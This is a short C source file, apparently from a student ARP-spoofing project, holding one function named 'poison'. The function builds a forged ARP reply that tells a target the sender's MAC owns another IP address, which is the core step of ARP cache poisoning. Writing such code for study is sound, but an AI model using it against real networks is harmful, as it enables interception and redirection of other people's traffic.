//
// Created by tnoulens on 11/3/23.
//

#include "malcolm.h"

void    poison(t_data *data, t_arp_packet *rep, struct ethhdr *eth)
{
	uint32_t tmp_sender = rep->arp_spa;
	uint32_t tmp_destination = rep->arp_dpa;

	ft_memcpy(eth->h_dest, data->target_mac, ETH_ALEN);
	ft_memcpy(eth->h_source, data->source_mac, ETH_ALEN);
	rep->arp_opcode = htons(ARPOP_REPLY);
	rep->arp_spa = tmp_destination;
	ft_memcpy(rep->arp_sha, data->source_mac, ETH_ALEN);
	rep->arp_dpa = tmp_sender;
	ft_memcpy(rep->arp_dha, data->target_mac, ETH_ALEN);
}
